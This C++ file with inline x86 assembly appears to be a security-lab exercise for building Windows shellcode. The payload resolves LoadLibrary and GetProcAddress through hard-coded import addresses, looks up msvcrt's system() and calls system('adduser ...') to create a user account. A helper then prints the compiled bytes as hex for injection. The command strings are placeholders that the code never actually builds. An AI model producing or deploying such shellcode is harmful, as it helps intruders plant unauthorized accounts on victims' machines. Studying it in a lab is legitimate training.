#include <cstdio>
#include <cstdint>

// Require Visual Studio to build

void code_output(int start, int end);
int main()
{
	int start;
	int end;
	__asm {
		jmp	End;
	Start:

		// Write your code here
		push	ebp; 保存ebp，esp－4
		mov		ebp, esp; 给ebp赋新值，将作为局部变量的基指针
		xor edi, edi;
		push	edi; 压入0，esp－4,
		add		esp, -1A0h;
		xor		eax, eax;
		mov		byte ptr [ebp - 0x16], al
		mov		byte ptr [ebp - 0x2A], al
		mov		byte ptr [ebp - 0x3E], al
		lea		eax, [ebp - 0x20]; "msvcrt.dll"
		push	eax
		xor     eax, eax
		mov		ebx, -0x4642D8; eax = LoadLibrary("msvcrt.dll")
		sub		eax, ebx
		call	[eax]
		mov     ebx, eax
		lea		eax, [ebp - 0x30]; "system"
		push	eax
		push	ebx
		xor		eax, eax
		mov		ebx, -0x4642DC
		sub		eax, ebx
		call	[eax]; eax = GetProcAddress(ebx, "system");
		mov		ebx, eax
		lea		eax, [ebp - 0x50]; "adduser ..."
		push	eax
		call	ebx; system("adduser ...")
		
	End:
		lea eax, Start
		mov [start], eax
		lea eax, End
		mov [end], eax
	}

	code_output(start, end);
	return 0;
}
void code_output(int start, int end)
{
	for (int i = start; i < end; )
	{
		for (int column = 0; column < 4; column++, i++)
		{
			uint8_t data = *(uint8_t*)i;
			printf("0x%02x,", data);
		}
		printf("\n");
	}
}